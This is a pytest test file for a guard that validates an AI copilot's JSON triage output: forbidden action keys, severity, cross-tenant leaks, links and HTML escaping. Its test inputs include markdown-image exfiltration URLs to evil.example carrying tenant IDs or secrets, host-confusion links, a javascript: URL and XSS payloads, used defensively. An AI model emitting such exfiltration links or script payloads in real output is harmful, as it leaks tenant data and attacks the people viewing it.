import html
import json

import pytest

from copilot_guard.output import Rejected, parse_model_output

T = "TEN-014"


def body(**changes):
    d = {"severity": "medium", "summary": "Repeated failed SSH logins from one address.",
         "next_step": "escalate_to_analyst", "related_alert_ids": []}
    d.update(changes)
    return d


def raw(**changes):
    return json.dumps(body(**changes))


def ok(text, known=()):
    return parse_model_output(text, tenant_id=T, known_alert_ids=set(known))


def why(text, known=()):
    with pytest.raises(Rejected) as exc:
        ok(text, known)
    return exc.value.reason


def test_valid_reply():
    r = ok(raw())
    assert r.severity == "medium" and r.next_step == "escalate_to_analyst"
    assert r.related_alert_ids == [] and r.flags == []
    assert r.summary_html == html.escape("Repeated failed SSH logins from one address.")


@pytest.mark.parametrize("text", [
    "```json\n" + raw() + "\n```",
    "```\n" + raw() + "\n```",
    "  ```json\n" + raw() + "\n```  \n",
    "\n" + raw() + "\n",
])
def test_fenced_or_plain_json_is_accepted(text):
    assert ok(text).severity == "medium"


@pytest.mark.parametrize("text", [
    "Here is the result: " + raw(), "[1, 2]", "just some words", "", "```json\n[1]\n```",
    "```python\n" + raw() + "\n```", raw() + " thanks!", None,
])
def test_not_json(text):
    assert why(text) == "not_json"


@pytest.mark.parametrize("key", ["action", "actions", "tool_call", "tool_calls", "function_call"])
def test_forbidden_keys(key):
    d = body()
    d[key] = "anything"
    assert why(json.dumps(d)) == "forbidden_action"


@pytest.mark.parametrize("step", ["close_alert", "auto_close", "Close", "resolve_and_close"])
def test_a_closing_next_step_is_forbidden(step):
    assert why(raw(next_step=step)) == "forbidden_action"


@pytest.mark.parametrize("severity", ["urgent", None, 5, ["high"], "HIGH"])
def test_bad_severity(severity):
    assert why(raw(severity=severity)) == "bad_severity"


def test_missing_severity_is_bad():
    d = body()
    del d["severity"]
    assert why(json.dumps(d)) == "bad_severity"


@pytest.mark.parametrize("step", ["shutdown", None, ["monitor"], 3])
def test_bad_next_step(step):
    assert why(raw(next_step=step)) == "bad_next_step"


@pytest.mark.parametrize("summary", [None, 5, "", "   ", "x" * 601, ["a"]])
def test_bad_summary(summary):
    assert why(raw(summary=summary)) == "bad_summary"


def test_summary_length_limit_is_after_stripping():
    assert ok(raw(summary="x" * 600)).summary_html == "x" * 600
    assert ok(raw(summary=" " + "x" * 600 + " ")).summary_html == "x" * 600


@pytest.mark.parametrize("ids", ["a", [1], [None], {"a": 1}, None])
def test_bad_related_alert_ids(ids):
    assert why(raw(related_alert_ids=ids)) == "bad_related_alert_ids"


def test_missing_related_alert_ids_means_empty():
    d = body()
    del d["related_alert_ids"]
    assert ok(json.dumps(d)).related_alert_ids == []


def test_the_order_of_the_checks():
    assert why(raw(severity="bad", next_step="bad")) == "bad_severity"
    assert why(raw(next_step="bad", summary="")) == "bad_next_step"
    assert why(raw(summary="", related_alert_ids="x")) == "bad_summary"


def test_other_tenants_are_never_mentioned():
    assert why(raw(summary="Also seen in TEN-015.")) == "cross_tenant_reference"
    assert why(raw(summary="Both TEN-014 and TEN-099 are affected.")) == "cross_tenant_reference"
    assert why(raw(summary="![x](https://evil.example/?t=TEN-015)")) == "cross_tenant_reference"
    assert "TEN-014" in ok(raw(summary="Tenant TEN-014 is affected.")).summary_html


def test_related_ids_are_real_and_unique_in_order():
    r = ok(raw(related_alert_ids=["b", "a", "b", "zzz", "a"]), known={"a", "b"})
    assert r.related_alert_ids == ["b", "a"] and r.flags == ["unknown_alert_id"]
    r = ok(raw(related_alert_ids=["a", "a"]), known={"a"})
    assert r.related_alert_ids == ["a"] and r.flags == []


def test_image_is_removed():
    r = ok(raw(summary="See ![x](https://evil.example/p?d=secret) now"))
    assert r.summary_html == "See [image removed] now" and r.flags == ["image_removed"]


@pytest.mark.parametrize("url", ["https://attack.mitre.org/techniques/T1110/", "http://hisn.local/alerts/1"])
def test_allowed_links_are_kept(url):
    r = ok(raw(summary=f"Read [this]({url}) first"))
    assert url in r.summary_html and r.flags == []


@pytest.mark.parametrize("url", [
    "https://attack.mitre.org.evil.example/",
    "https://hisn.local@evil.example/",
    "http://hisn.local.evil.example",
    "https://evil.example/",
    "javascript:alert(1)",
    "ftp://hisn.local/x",
    "https://evil.example\\@hisn.local/",
])
def test_foreign_or_tricky_links_are_removed(url):
    r = ok(raw(summary=f"Open [x]({url}) now"))
    assert r.summary_html == "Open x now" and r.flags == ["link_removed"]


def test_bare_urls():
    r = ok(raw(summary="See https://evil.example/a now"))
    assert r.summary_html == "See [link removed] now" and r.flags == ["link_removed"]
    r = ok(raw(summary="See https://hisn.local/alerts/1 now"))
    assert r.summary_html == "See https://hisn.local/alerts/1 now" and r.flags == []


def test_all_flags_together_are_sorted_and_unique():
    r = ok(raw(summary="![a](http://x.example/1) [b](http://y.example/2) http://z.example/3",
               related_alert_ids=["nope"]))
    assert r.flags == ["image_removed", "link_removed", "unknown_alert_id"]


@pytest.mark.parametrize("summary", [
    "Use <b>bold</b> & \"quotes\" and 'single'", "<script>alert(1)</script>", "a < b > c",
    "<img src=x onerror=alert(1)>",
])
def test_the_summary_is_safe_to_render(summary):
    r = ok(raw(summary=summary))
    for char in "<>\"'":
        assert char not in r.summary_html
    assert html.unescape(r.summary_html) == summary.strip()